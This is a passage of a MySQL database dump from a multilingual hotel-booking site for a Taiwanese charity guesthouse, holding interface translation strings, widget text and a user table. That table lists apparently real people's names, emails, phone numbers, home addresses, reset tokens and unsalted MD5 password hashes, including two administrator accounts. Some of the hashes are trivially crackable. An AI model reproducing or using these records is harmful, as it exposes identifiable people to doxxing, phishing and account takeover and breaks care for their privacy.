(114, 5, 'NEW_PASSWORD_NOTICE', 'Please enter your e-mail address corresponding to your account. A new password will be sent to you by e-mail.'),
(115, 1, 'USERNAME', 'Utilisateur'),
(115, 2, 'USERNAME', '使用者名稱'),
(115, 3, 'USERNAME', 'Username'),
(115, 5, 'USERNAME', '使用者名稱'),
(116, 1, 'PASSWORD_CONFIRM', 'Confirmer mot de passe'),
(116, 2, 'PASSWORD_CONFIRM', '確認密碼'),
(116, 3, 'PASSWORD_CONFIRM', 'Confirm password'),
(116, 5, 'PASSWORD_CONFIRM', '確認密碼'),
(117, 1, 'USERNAME_EXISTS', 'Un compte existe déjà avec ce nom d\'utilisateur'),
(117, 2, 'USERNAME_EXISTS', '此帳戶已存在且被使用'),
(117, 3, 'USERNAME_EXISTS', 'An account already exists with this username'),
(117, 5, 'USERNAME_EXISTS', '此帳戶已存在且被使用'),
(118, 1, 'ACCOUNT_EDIT_SUCCESS', 'Les informations de votre compte ont bien été modifiées.'),
(118, 2, 'ACCOUNT_EDIT_SUCCESS', '您的個人帳戶資訊已更改。'),
(118, 3, 'ACCOUNT_EDIT_SUCCESS', 'Your account information have been changed.'),
(118, 5, 'ACCOUNT_EDIT_SUCCESS', '您的個人帳戶資訊已更改。'),
(119, 1, 'ACCOUNT_EDIT_FAILURE', 'Echec de la modification des informations de compte.'),
(119, 2, 'ACCOUNT_EDIT_FAILURE', 'An error occured during the modification of the account information.'),
(119, 3, 'ACCOUNT_EDIT_FAILURE', 'An error occured during the modification of the account information.'),
(119, 5, 'ACCOUNT_EDIT_FAILURE', 'An error occured during the modification of the account information.'),
(120, 1, 'ACCOUNT_CREATE_FAILURE', 'Echec de la création du compte.'),
(120, 2, 'ACCOUNT_CREATE_FAILURE', '帳戶建立失敗。'),
(120, 3, 'ACCOUNT_CREATE_FAILURE', 'Failed to create account.'),
(120, 5, 'ACCOUNT_CREATE_FAILURE', '帳戶建立失敗。'),
(121, 1, 'PAYMENT_CHECK', 'Par chèque'),
(121, 2, 'PAYMENT_CHECK', '以支票付款'),
(121, 3, 'PAYMENT_CHECK', 'By check'),
(121, 5, 'PAYMENT_CHECK', '以支票付款'),
(122, 1, 'PAYMENT_ARRIVAL', 'A l\'arrivée'),
(122, 2, 'PAYMENT_ARRIVAL', '抵達時付款'),
(122, 3, 'PAYMENT_ARRIVAL', 'On arrival'),
(122, 5, 'PAYMENT_ARRIVAL', '抵達時付款'),
(123, 1, 'CHOOSE_PAYMENT', 'Choisissez un moyen de paiement'),
(123, 2, 'CHOOSE_PAYMENT', '選擇付款方式'),
(123, 3, 'CHOOSE_PAYMENT', 'Choose a method of payment'),
(123, 5, 'CHOOSE_PAYMENT', '選擇付款方式'),
(124, 1, 'PAYMENT_CREDIT_CARDS', 'Cartes de credit'),
(124, 2, 'PAYMENT_CREDIT_CARDS', '信用卡'),
(124, 3, 'PAYMENT_CREDIT_CARDS', 'Credit cards'),
(124, 5, 'PAYMENT_CREDIT_CARDS', '信用卡'),
(125, 1, 'MAX_ADULTS', 'Adultes max'),
(125, 2, 'MAX_ADULTS', '最多成人人數'),
(125, 3, 'MAX_ADULTS', 'Max adults'),
(125, 5, 'MAX_ADULTS', '最多成人人數'),
(126, 1, 'MAX_CHILDREN', 'Enfants max'),
(126, 2, 'MAX_CHILDREN', '最多孩童人數'),
(126, 3, 'MAX_CHILDREN', 'Max children'),
(126, 5, 'MAX_CHILDREN', '最多孩童人數'),
(127, 1, 'PAYMENT_2CHECKOUT_NOTICE', 'Cliquez sur \"Payer\" ci-dessous, vous allez être redirigé vers le site sécurisé de 2Checkout.com'),
(127, 2, 'PAYMENT_2CHECKOUT_NOTICE', 'Click on \"Check Out\" below, you will be redirected towards the secure site of 2Checkout.com'),
(127, 3, 'PAYMENT_2CHECKOUT_NOTICE', 'Click on \"Check Out\" below, you will be redirected towards the secure site of 2Checkout.com'),
(127, 5, 'PAYMENT_2CHECKOUT_NOTICE', 'Click on \"Check Out\" below, you will be redirected towards the secure site of 2Checkout.com'),
(128, 1, 'COOKIES_NOTICE', 'Les cookies nous aident à fournir une meilleure expérience utilisateur. En utilisant notre site, vous acceptez l\'utilisation de cookies.'),
(128, 2, 'COOKIES_NOTICE', 'Cookies help us provide better user experience. By using our website, you agree to the use of cookies.'),
(128, 3, 'COOKIES_NOTICE', 'Cookies help us provide better user experience. By using our website, you agree to the use of cookies.'),
(128, 5, 'COOKIES_NOTICE', 'Cookies help us provide better user experience. By using our website, you agree to the use of cookies.'),
(129, 1, 'DURATION', 'Durée'),
(129, 2, 'DURATION', '期間'),
(129, 3, 'DURATION', 'Duration'),
(129, 5, 'DURATION', '期間'),
(130, 1, 'PERSON', 'Personne'),
(130, 2, 'PERSON', '人數'),
(130, 3, 'PERSON', 'Person'),
(130, 5, 'PERSON', '人數'),
(131, 1, 'CHOOSE_A_DATE', 'Choisissez une date'),
(131, 2, 'CHOOSE_A_DATE', '選擇日期'),
(131, 3, 'CHOOSE_A_DATE', 'Choose a date'),
(131, 5, 'CHOOSE_A_DATE', '選擇日期'),
(132, 1, 'TIMESLOT', 'Horaire'),
(132, 2, 'TIMESLOT', 'Time slot'),
(132, 3, 'TIMESLOT', 'Time slot'),
(132, 5, 'TIMESLOT', 'Time slot'),
(133, 1, 'ACTIVITIES', 'Activités'),
(133, 2, 'ACTIVITIES', 'Activities'),
(133, 3, 'ACTIVITIES', 'Activities'),
(133, 5, 'ACTIVITIES', 'Activities'),
(134, 1, 'DESTINATION', 'Destination'),
(134, 2, 'DESTINATION', 'Destination'),
(134, 3, 'DESTINATION', 'Destination'),
(134, 5, 'DESTINATION', 'Destination'),
(135, 1, 'NO_HOTEL_FOUND', 'Aucun hotel trouvé'),
(135, 2, 'NO_HOTEL_FOUND', 'No hotel found'),
(135, 3, 'NO_HOTEL_FOUND', 'No hotel found'),
(135, 5, 'NO_HOTEL_FOUND', 'No hotel found'),
(136, 1, 'FOR', 'pour'),
(136, 2, 'FOR', 'for'),
(136, 3, 'FOR', 'for'),
(136, 5, 'FOR', 'for'),
(137, 1, 'FIND_ACTIVITIES_AND_TOURS', 'Découvrez nos activités et excursions'),
(137, 2, 'FIND_ACTIVITIES_AND_TOURS', 'Find out our activities and tours'),
(137, 3, 'FIND_ACTIVITIES_AND_TOURS', 'Find out our activities and tours'),
(137, 5, 'FIND_ACTIVITIES_AND_TOURS', 'Find out our activities and tours'),
(138, 1, 'MINUTES', 'minute(s)'),
(138, 2, 'MINUTES', '分'),
(138, 3, 'MINUTES', 'minute(s)'),
(138, 5, 'MINUTES', '分'),
(139, 1, 'HOURS', 'heure(s)'),
(139, 2, 'HOURS', '時'),
(139, 3, 'HOURS', 'hour(s)'),
(139, 5, 'HOURS', '時'),
(140, 1, 'DAYS', 'jour(s)'),
(140, 2, 'DAYS', '天'),
(140, 3, 'DAYS', 'day(s)'),
(140, 5, 'DAYS', '天'),
(141, 1, 'WEEKS', 'semaine(s)'),
(141, 2, 'WEEKS', '週'),
(141, 3, 'WEEKS', 'week(s)'),
(141, 5, 'WEEKS', '週'),
(142, 1, 'RESULTS', 'Résultats'),
(142, 2, 'RESULTS', '結果'),
(142, 3, 'RESULTS', 'Results'),
(142, 5, 'RESULTS', '結果'),
(143, 1, 'BOOKING_HISTORY', 'Historique des réservations'),
(143, 2, 'BOOKING_HISTORY', '訂房歷史紀錄'),
(143, 3, 'BOOKING_HISTORY', 'Booking history'),
(143, 5, 'BOOKING_HISTORY', '訂房歷史紀錄'),
(144, 1, 'BOOKING_SUMMARY', 'Résumé de la réservation'),
(144, 2, 'BOOKING_SUMMARY', '訂房資訊'),
(144, 3, 'BOOKING_SUMMARY', 'Booking summary'),
(144, 5, 'BOOKING_SUMMARY', '訂房資訊'),
(145, 1, 'BOOKING_DATE', 'Date de la réservations'),
(145, 2, 'BOOKING_DATE', '訂房日期'),
(145, 3, 'BOOKING_DATE', 'Booking date'),
(145, 5, 'BOOKING_DATE', '訂房日期'),
(146, 1, 'NO_BOOKING_YET', 'Pas encore de réservation...'),
(146, 2, 'NO_BOOKING_YET', '尚未訂房'),
(146, 3, 'NO_BOOKING_YET', 'No booking yet...'),
(146, 5, 'NO_BOOKING_YET', '尚未訂房'),
(147, 1, 'PAYMENT', 'Paiement'),
(147, 2, 'PAYMENT', '付款方式'),
(147, 3, 'PAYMENT', 'Payment'),
(147, 5, 'PAYMENT', '付款方式'),
(148, 1, 'PAYMENT_DATE', 'Date du paiement'),
(148, 2, 'PAYMENT_DATE', '付款日期'),
(148, 3, 'PAYMENT_DATE', 'Payment date'),
(148, 5, 'PAYMENT_DATE', '付款日期'),
(149, 1, 'PAYMENT_METHOD', 'Méthode de paiement'),
(149, 2, 'PAYMENT_METHOD', '付款方式'),
(149, 3, 'PAYMENT_METHOD', 'Payment method'),
(149, 5, 'PAYMENT_METHOD', '付款方式'),
(150, 1, 'NUM_TRANSACTION', 'N°transaction'),
(150, 2, 'NUM_TRANSACTION', 'Num. transaction'),
(150, 3, 'NUM_TRANSACTION', 'Num. transaction'),
(150, 5, 'NUM_TRANSACTION', 'Num. transaction'),
(151, 1, 'STATUS', 'Statut'),
(151, 2, 'STATUS', '狀態'),
(151, 3, 'STATUS', 'Status'),
(151, 5, 'STATUS', '狀態'),
(152, 1, 'AWAITING', 'En attente'),
(152, 2, 'AWAITING', '等待中'),
(152, 3, 'AWAITING', 'Awaiting'),
(152, 5, 'AWAITING', '等待中'),
(153, 1, 'CANCELLED', 'Annulé'),
(153, 2, 'CANCELLED', '已取消'),
(153, 3, 'CANCELLED', 'Cancelled'),
(153, 5, 'CANCELLED', '已取消'),
(154, 1, 'REJECTED_PAYMENT', 'Paiement rejeté'),
(154, 2, 'REJECTED_PAYMENT', '付款被拒'),
(154, 3, 'REJECTED_PAYMENT', 'Rejected payment'),
(154, 5, 'REJECTED_PAYMENT', '付款被拒'),
(155, 1, 'PAYED', 'Payé'),
(155, 2, 'PAYED', '已付款'),
(155, 3, 'PAYED', 'Payed'),
(155, 5, 'PAYED', '已付款'),
(156, 1, 'INCL_TAX', 'TTC'),
(156, 2, 'INCL_TAX', '已含稅'),
(156, 3, 'INCL_TAX', 'incl. tax'),
(156, 5, 'INCL_TAX', '已含稅'),
(157, 1, 'TAGS', 'Tags'),
(157, 2, 'TAGS', 'Tags'),
(157, 3, 'TAGS', 'Tags'),
(157, 5, 'TAGS', 'Tags'),
(158, 1, 'ARCHIVES', 'Archives'),
(158, 2, 'ARCHIVES', 'Archives'),
(158, 3, 'ARCHIVES', 'Archives'),
(158, 5, 'ARCHIVES', 'Archives'),
(162, 1, 'LOAD_MORE', 'Voir plus'),
(162, 2, 'LOAD_MORE', '載入更多'),
(162, 3, 'LOAD_MORE', 'Load more'),
(162, 5, 'LOAD_MORE', '載入更多'),
(163, 1, 'DO_YOU_HAVE_A_COUPON', 'Avez-vous un code promo ?'),
(163, 2, 'DO_YOU_HAVE_A_COUPON', '是否使用優惠代碼?'),
(163, 3, 'DO_YOU_HAVE_A_COUPON', 'Do you have a coupon?'),
(163, 5, 'DO_YOU_HAVE_A_COUPON', '是否使用優惠代碼?'),
(164, 1, 'DISCOUNT', 'Réduction'),
(164, 2, 'DISCOUNT', '折扣'),
(164, 3, 'DISCOUNT', 'Discount'),
(164, 5, 'DISCOUNT', '折扣'),
(165, 1, 'COUPON_CODE_SUCCESS', 'Félicitations ! Le code promo a été ajouté avec succès.'),
(165, 2, 'COUPON_CODE_SUCCESS', '恭喜！ 優惠券代碼已成功添加。'),
(165, 3, 'COUPON_CODE_SUCCESS', 'Congratulations! The coupon code has been successfully added.'),
(165, 5, 'COUPON_CODE_SUCCESS', '恭喜！ 優惠券代碼已成功添加。'),
(166, 1, 'ROOMS', 'chambres'),
(166, 2, 'ROOMS', '客房'),
(166, 3, 'ROOMS', 'rooms'),
(166, 5, 'ROOMS', '客房'),
(167, 1, 'ADULT', 'adulte'),
(167, 2, 'ADULT', '成人'),
(167, 3, 'ADULT', 'adult'),
(167, 5, 'ADULT', '成人'),
(168, 1, 'CHILD', 'enfant'),
(168, 2, 'CHILD', '孩童'),
(168, 3, 'CHILD', 'child'),
(168, 5, 'CHILD', '孩童'),
(169, 1, 'ACTIVITY', 'Activité'),
(169, 2, 'ACTIVITY', 'Activity'),
(169, 3, 'ACTIVITY', 'Activity'),
(169, 5, 'ACTIVITY', 'Activity'),
(170, 1, 'DATE', 'Date'),
(170, 2, 'DATE', '日期'),
(170, 3, 'DATE', 'Date'),
(170, 5, 'DATE', '日期'),
(171, 1, 'QUANTITY', 'Quantité'),
(171, 2, 'QUANTITY', '數量'),
(171, 3, 'QUANTITY', 'Quantity'),
(171, 5, 'QUANTITY', '數量'),
(172, 1, 'SERVICE', 'Service'),
(172, 2, 'SERVICE', '服務'),
(172, 3, 'SERVICE', 'Service'),
(172, 5, 'SERVICE', '服務'),
(173, 1, 'BOOKING_NOTICE', '<h2>Réservez sur notre site</h2><p class=\"lead mb0\">Dépêchez-vous ! Sélectionnez vos chambres, complétez votre réservation et profitez de nos packages et offres spéciales ! <br><b>Meilleur prix garanti !</b></p>'),
(173, 2, 'BOOKING_NOTICE', '<h2>馬上訂房！</h2><p class=\"lead mb0\">選擇您想要的房型，趕快下訂吧！<br><b>有各種住宿方案優惠可搭配哦！</b></p>'),
(173, 3, 'BOOKING_NOTICE', '<h2>Book on our website</h2><p class=\"lead mb0\">Hurry up! Select the your rooms, complete your booking and take advantage of our special offers and packages!<br><b>Best price guarantee!</b></p>'),
(173, 5, 'BOOKING_NOTICE', '<h2>馬上訂房！</h2><p class=\"lead mb0\">選擇您想要的房型，趕快下訂吧！<br><b>有各種住宿方案優惠可搭配哦！</b></p>'),
(174, 1, 'CONTINUE_AS_GUEST', 'Continuer sans m\'enregistrer'),
(174, 2, 'CONTINUE_AS_GUEST', '已訪客身分繼續'),
(174, 3, 'CONTINUE_AS_GUEST', 'Continue as guest'),
(174, 5, 'CONTINUE_AS_GUEST', '已訪客身分繼續'),
(175, 1, 'NUM_ROOMS', 'Nb chambres'),
(175, 2, 'NUM_ROOMS', '房間數量'),
(175, 3, 'NUM_ROOMS', 'Num rooms'),
(175, 5, 'NUM_ROOMS', '房間數量'),
(176, 1, 'PRIVACY_POLICY_AGREEMENT', '<small>J\'accepte que les informations recueillies par ce formulaire soient stockées dans un fichier informatisé afin de traiter ma demande.<br>Conformément au \"Réglement Général sur la Protection des Données\", vous pouvez exercer votre droit d\'accès aux données vous concernant et les faire rectifier via le formulaire de contact.</small>'),
(176, 2, 'PRIVACY_POLICY_AGREEMENT', '<small>我同意以下內容:為了在本網站上提供您最佳的互動性服務，可能會請您提供相關個人的資料，其範圍如下：本網站在您使用聯絡我們、會員註冊、電子郵件聯絡…等互動性功能時，會保留您所提供的姓名、電子郵件地址、電話…等聯絡方式及使用時間等。於一般瀏覽時，伺服器會自行記錄相關行徑，包括您使用連線設備的IP位址、使用時間、使用的瀏覽器、瀏覽及點選資料記錄等，做為我們增進網站服務的參考依據，此記錄為內部應用，決不對外公布。除非取得您的同意、回應您的詢問或其他法令之特別規定，本網站絕不會將您的個人資料揭露予第三人或使用於以上資料蒐集目的以外之其他用途。在回應您的詢問及進行合理的客戶服務範圍下，您的個資可能會轉交予勵馨基金會與您直接連繫。</small>'),
(176, 3, 'PRIVACY_POLICY_AGREEMENT', '<small>I agree that the information collected by this form will be stored in a database in order to process my request.<br>In accordance with the \"General Data Protection Regulation\", you can exercise your right to access to your data and make them rectified via the contact form.</small>'),
(176, 5, 'PRIVACY_POLICY_AGREEMENT', '<small>我同意以下內容:為了在本網站上提供您最佳的互動性服務，可能會請您提供相關個人的資料，其範圍如下：本網站在您使用聯絡我們、會員註冊、電子郵件聯絡…等互動性功能時，會保留您所提供的姓名、電子郵件地址、電話…等聯絡方式及使用時間等。於一般瀏覽時，伺服器會自行記錄相關行徑，包括您使用連線設備的IP位址、使用時間、使用的瀏覽器、瀏覽及點選資料記錄等，做為我們增進網站服務的參考依據，此記錄為內部應用，決不對外公布。除非取得您的同意、回應您的詢問或其他法令之特別規定，本網站絕不會將您的個人資料揭露予第三人或使用於以上資料蒐集目的以外之其他用途。在回應您的詢問及進行合理的客戶服務範圍下，您的個資可能會轉交予勵馨基金會與您直接連繫。</small>'),
(177, 1, 'COMPLETE_YOUR_BOOKING', 'Terminez votre réservation !'),
(177, 2, 'COMPLETE_YOUR_BOOKING', '未完成的訂單'),
(177, 3, 'COMPLETE_YOUR_BOOKING', 'Complete your booking!'),
(177, 5, 'COMPLETE_YOUR_BOOKING', '未完成的訂單'),
(178, 1, 'PENDING', 'En attente'),
(178, 2, 'PENDING', '等待付款中'),
(178, 3, 'PENDING', 'Pending'),
(178, 5, 'PENDING', '等待付款中'),
(179, 1, 'CHILDREN_AGE', 'Age des enfants'),
(179, 2, 'CHILDREN_AGE', '孩童年齡'),
(179, 3, 'CHILDREN_AGE', 'Age of children'),
(179, 5, 'CHILDREN_AGE', '孩童年齡'),
(180, 1, 'BOOK_NOW', 'Réserver maintenant'),
(180, 2, 'BOOK_NOW', '立即訂房'),
(180, 3, 'BOOK_NOW', 'Book now'),
(180, 5, 'BOOK_NOW', '立即訂房'),
(181, 1, 'DISCOVER_ALSO', 'Découvrez aussi'),
(181, 2, 'DISCOVER_ALSO', 'Discover also'),
(181, 3, 'DISCOVER_ALSO', 'Discover also'),
(181, 5, 'DISCOVER_ALSO', 'Discover also'),
(182, 1, 'PAYMENT_BRAINTREE_NOTICE', 'Remplissez le formulaire ci-dessous avec les informations de votre carte de crédit, puis cliquez sur \"Payer\".'),
(182, 2, 'PAYMENT_BRAINTREE_NOTICE', 'Fill in the form bellow with your credit card information, then click on \"Check Out\".'),
(182, 3, 'PAYMENT_BRAINTREE_NOTICE', 'Fill in the form bellow with your credit card information, then click on \"Check Out\".'),
(182, 5, 'PAYMENT_BRAINTREE_NOTICE', 'Fill in the form bellow with your credit card information, then click on \"Check Out\".'),
(183, 1, 'COUPON_CODE_FAILURE', 'Erreur : ce code est invalide ou a déjà été utilisé'),
(183, 2, 'COUPON_CODE_FAILURE', 'Error: this code is invalid or already used'),
(183, 3, 'COUPON_CODE_FAILURE', 'Error: this code is invalid or already used'),
(183, 5, 'COUPON_CODE_FAILURE', 'Error: this code is invalid or already used'),
(184, 1, 'PAYMENT_RAZORPAY_NOTICE', 'Cliquez sur \"Payer\", puis remplissez le formulaire avec les informations de votre carte de crédit.'),
(184, 2, 'PAYMENT_RAZORPAY_NOTICE', 'Click on \"Check Out\", then fill in the form with your credit card information.'),
(184, 3, 'PAYMENT_RAZORPAY_NOTICE', 'Click on \"Check Out\", then fill in the form with your credit card information.'),
(184, 5, 'PAYMENT_RAZORPAY_NOTICE', 'Click on \"Check Out\", then fill in the form with your credit card information.'),
(185, 1, 'YO', 'y.o.'),
(185, 2, 'YO', 'ans'),
(185, 3, 'YO', 'y.o.'),
(185, 5, 'YO', 'ans');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_user`
--

CREATE TABLE `pm_user` (
  `id` int(11) NOT NULL,
  `firstname` varchar(100) DEFAULT NULL,
  `lastname` varchar(100) DEFAULT NULL,
  `email` varchar(100) DEFAULT NULL,
  `login` varchar(50) DEFAULT NULL,
  `pass` varchar(100) DEFAULT NULL,
  `type` varchar(20) DEFAULT NULL,
  `add_date` int(11) DEFAULT NULL,
  `edit_date` int(11) DEFAULT NULL,
  `checked` int(11) DEFAULT 0,
  `fb_id` varchar(50) DEFAULT NULL,
  `address` varchar(250) DEFAULT NULL,
  `postcode` varchar(10) DEFAULT NULL,
  `city` varchar(100) DEFAULT NULL,
  `company` varchar(100) DEFAULT NULL,
  `country` varchar(100) DEFAULT NULL,
  `mobile` varchar(50) DEFAULT NULL,
  `phone` varchar(50) DEFAULT NULL,
  `token` varchar(50) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_user`
--

INSERT INTO `pm_user` (`id`, `firstname`, `lastname`, `email`, `login`, `pass`, `type`, `add_date`, `edit_date`, `checked`, `fb_id`, `address`, `postcode`, `city`, `company`, `country`, `mobile`, `phone`, `token`) VALUES
(1, 'Administrator', '鄭', 'goh2078@goh.org.tw', 'goh2078', '2a813c5d7ff43e1c7a14dee12f267af3', 'administrator', 1644370645, 1679990383, 1, '', '隨意', '236', '天龍國', '', '', '0981761985', '', ''),
(2, '名弘', '簡', 's10017@goh.org.tw', 'goh9999', 'd13d9500b9dd1f5dcc4c9287a8af0804', 'administrator', 1651645184, 1672968523, 1, NULL, '950', '950', '台東', '', '', '0928542052', '', NULL),
(3, '', '', 'joanhui0728@gmail.com', 'Joanne', '1517cec19dea84d87a419a211cc5b1b1', 'registered', 1664266878, NULL, NULL, NULL, '', '', '', '', '', '', '', 'b6764552df339c7607fba385103d29f9'),
(4, '王啓勲', '', 'roger060323@gmail.com', 'roger.wang', 'e10adc3949ba59abbe56e057f20f883e', 'registered', 1666690985, 1692609097, 1, NULL, '', '', '', '', '', '', '', '3ca2e8f58abb762908477225d4dfd32b'),
(6, '大少', '鄭', 'smarterlighter@yahoo.com', 'johncheng', '2a813c5d7ff43e1c7a14dee12f267af3', 'registered', 1668135214, 1668135435, 1, NULL, '新北市新店街順安街2-1', '231', '馨北市', '', 'Taiwan', '098176195', '098176195', ''),
(7, '', '', 'smarterlighter@icloud.com', 'smarterlighter', 'ffde38b5980d70e9c19cf68366c06786', 'registered', 1668135556, NULL, 1, NULL, '', '', '', '', '', '', '', ''),
(8, '貞如', '陳', 'jeanjuchen@gmail.com', 'chenjeanju', '3ad83c861debe1244af8c62246582323', 'registered', 1670664008, 1670664187, 1, NULL, '台北市中正區仁愛路一段4號9樓', '10019', '台北市', '', 'Taiwan', '', '0916681186', ''),
(9, '孟娟', '陳', 'chengwinni0721@gmail.com', '陳孟娟', '92ac481ce68a3692716a3ebd4e2163f5', 'registered', 1671517580, 1671518507, 1, NULL, '豐原區綠山街福陽巷16號 ', '420', '台中市 ', '', '', '0912965334', '0912965334', ''),
(10, '佑漢', '林', 'a0984174290@gmail.com', '林佑漢', '0b7cc3649803928a205f711e90beaf44', 'registered', 1671833263, 1671833436, 1, NULL, '花蓮縣富里鄉萬寧村五鄰二號', '98392', '花蓮縣', '', '', '0903619166', '', ''),
(11, '偉翔', '黃', 'weihsiang0822@gmail.com', 'weihsiang', 'f80b4564cde1080bf180ae31640f77c3', 'registered', 1672581221, 1672582708, 1, NULL, '彰化縣芬園鄉竹林村竹東路142號', '502', '彰化縣', '', '', '0916898122', '0916898122', ''),
(12, '錦忠', '許', 'jon.cc.hsu@gmail.com', 'jonhsu', 'aee76b6201d1b71d86583b7c54a01b73', 'registered', 1672922079, 1672922323, 1, NULL, '台北市延壽街330巷17弄8號7樓', '105', '台北市', '', '', '0928143111', '0928143111', ''),
(13, '莉晴', '陳', 'goh2191@goh.org.tw', 'goh2191@goh.org.tw', '1c63129ae9db9c60c3e8aa94d3e00495', 'registered', 1672987857, 1672988024, 1, NULL, '台北市', '116', '台北市', '', 'Taiwan', '', '0919613154', ''),
(14, '', '', 'u3696888@gmail.com', '莊泊晨', '973c72dcb838198fe7619b1d255e2a19', 'registered', 1674028364, NULL, NULL, NULL, '', '', '', '', '', '', '', 'e7f521ba6f85aa1709536bec0e6c8b11'),
(15, '', '', 'po_kopo@hotmail.com', '尤星涵', 'e57923007977a60d7023190360b9c7ea', 'registered', 1675508281, NULL, NULL, NULL, '', '', '', '', '', '', '', 'baecfe6af11a402d5a8883dd36e025de'),
(16, '', '', 'sample@email.tst', 'uFPKKsNb', '32cc5886dc1fa8c106a02056292c4654', 'registered', 1679623012, NULL, NULL, NULL, '', '', '', '', '', '', '', '6d966c8c202b8feabb4cbce8676da443'),
(17, '佳翰', '蔡', 'ihate1022@gmail.com', '蔡佳翰', '7fd2daaca1918f36f6ed32765498dc85', 'registered', 1683949928, 1683955878, 1, NULL, '', '', '', '', '', '', '', ''),
(18, '楊', '仁豪', 'pikachu0405@gmail.com', 'pikachu', 'aac4125f53cc0ed77ff1fcef6b795f28', 'registered', 1684847447, 1684847642, 1, NULL, '花蓮縣吉安鄉東昌村東里15街54號', '907', '花蓮縣', '', '', '', '0936832518', ''),
(19, '', '', 'cm8318206@gmail.com', '陳啟明', 'bf03d343dcf0ec1a380edc5561ed2a4b', 'registered', 1684938427, NULL, 1, NULL, '', '', '', '', '', '', '', ''),
(20, '家寧', '郭', 'sweetann66@hotmail.com', 'sweetann66', 'c601ab411fde0f6d3573d18f0125e3d2', 'registered', 1685756560, 1685757453, 1, NULL, '桃園市桃園區新生路42號', '330', '桃園市', '', '', '0922447727', '0922447727', ''),
(21, '承澔', '吳', 'mdog0213@yahoo.com.tw', 'mdog0213', '57d69ccf63de2a8e3b8632f434893adf', 'registered', 1686232242, 1686232651, 1, NULL, '台北市北投區自強街53號4樓', '112050', '台北市', '', 'Taiwan', '0988426796', '（02）28236728', ''),
(22, '一茹', '羅', 'yir@tmail.ilc.edu.tw', 'Yir', '9d9ed60a03de4ac74f9c10ad4910a3cf', 'registered', 1687405083, 1687405775, 1, NULL, '宜蘭縣宜蘭市民族路320號5樓', '260008', '宜蘭', '', '', '0912591899', '0912591899', ''),
(23, '翎鳳', '羅', 't31290@gmail.com', 'May', '7315f315230c7d9d33d007366077087a', 'registered', 1689419643, 1689420294, 1, NULL, '', '', '', '', '', '0902273512', '', ''),
(24, '家憶', '陳', 'joy1792@hotmail.com', 'j chen', '63db7e332843e17293c1f8a13fcbe03c', 'registered', 1689776884, 1689777554, 1, NULL, '花蓮市中美路117號4樓之一', '970', '花蓮市', '', '', '', '0928554341', ''),
(25, '', '', 'testing@example.com', 'cODsoQHh', '80da5d337bf9606dd59f3480a125201e', 'registered', 1690180868, NULL, NULL, NULL, '', '', '', '', '', '', '', 'bf71e8eb78e263e827bd3ec7c79c28ec'),
(26, '', '', 'aruay1985@gmail.com', 'aruay1985', '340151ba1ac960ea63475347de30b376', 'registered', 1690885710, NULL, 1, NULL, '', '', '', '', '', '', '', ''),
(27, '熙眾', '安', 'emu602@gmail.com', '安熙眾', '7089a160ad26e75216c72e4c650b4382', 'registered', 1691123158, 1691132128, 1, NULL, '桃園市蘆竹區光明路1段113號7樓', '338', '桃園市', '', '', '0933215827', '0933215827', ''),
(28, '惠琴', '楊', 'Judy7077@gmail.com', 'Judy', 'a50e7c27656aa213d825925c9ec030dd', 'registered', 1694312635, 1694312885, 1, NULL, '新北市新店區永平街24號9樓', '241', '新店區', '', 'Taiwan', '0910383448', '0229478908', ''),
(29, '', '', 'vivianyc0703@yahoo.com.tw', 'vivian0703', 'f508940720657dd1daa4dd90873720a7', 'registered', 1694497089, NULL, 1, NULL, '', '', '', '', '', '', '', '');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_widget`
--

CREATE TABLE `pm_widget` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `title` varchar(250) DEFAULT NULL,
  `showtitle` int(11) DEFAULT NULL,
  `pos` varchar(20) DEFAULT NULL,
  `allpages` int(11) DEFAULT NULL,
  `pages` varchar(250) DEFAULT NULL,
  `type` varchar(20) DEFAULT NULL,
  `content` longtext DEFAULT NULL,
  `class` varchar(200) DEFAULT NULL,
  `checked` int(11) DEFAULT 0,
  `rank` int(11) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_widget`
--

INSERT INTO `pm_widget` (`id`, `lang`, `title`, `showtitle`, `pos`, `allpages`, `pages`, `type`, `content`, `class`, `checked`, `rank`) VALUES
(1, 1, 'Qui sommes-nous ?', 1, 'footer_col_1', 1, '', '', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vestibulum eget auctor ipsum. Mauris pharetra neque a mauris commodo, at aliquam leo malesuada. Maecenas eget elit eu ligula rhoncus dapibus at non erat. In sed velit eget eros gravida consectetur varius imperdiet lectus.</p>', '', 1, 1),
(1, 2, '關於我們', 1, 'footer_col_1', 1, '', '', '<p><span style=\"color:hsl(0, 0%, 100%);\">隸屬</span><a href=\"http://www.goh.org.tw/\"><span style=\"color:hsl(180, 75%, 60%);\">勵馨基金會</span></a><span style=\"color:hsl(0, 0%, 100%);\">的愛馨會館，是全台首創公益旅店，創立的初衷是培養台東弱勢婦女自信及就業技能，婦女可以在這個友善的環境裡，學習旅館/民宿相關的房務整理、櫃檯接待等技能。這裡的每一份營收，都用於公益，幫助/支持更多有需要的弱勢婦女。</span></p><p><span style=\"color:hsl(0, 0%, 100%);\">竭誠歡迎您，前來體驗會館舒適、簡約風格的住宿設施與貼心服務，感受一下台東山水之外的人文之美。</span></p>', '', 1, 1),
(1, 3, 'عنا', 1, 'footer_col_1', 1, '', '', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vestibulum eget auctor ipsum. Mauris pharetra neque a mauris commodo, at aliquam leo malesuada. Maecenas eget elit eu ligula rhoncus dapibus at non erat. In sed velit eget eros gravida consectetur varius imperdiet lectus.</p>', '', 1, 1),
